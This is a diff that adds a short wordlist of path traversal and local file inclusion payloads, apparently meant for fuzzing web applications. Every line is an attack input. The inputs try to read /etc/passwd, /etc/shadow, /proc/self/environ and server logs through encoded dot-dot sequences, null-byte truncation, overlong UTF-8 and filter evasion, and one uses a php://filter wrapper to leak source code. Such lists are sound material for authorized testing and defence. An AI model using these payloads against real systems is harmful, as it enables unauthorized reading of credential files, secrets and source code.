@@ -1,0 +1,14 @@
+../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/var/log/apache2/access.log
+../../../../../../etc/passwd%00
+..\/..\/..\/etc\/passwd
+....//....//etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+/etc/passwd%00.jpg
+php://filter/convert.base64-encode/resource=index.php
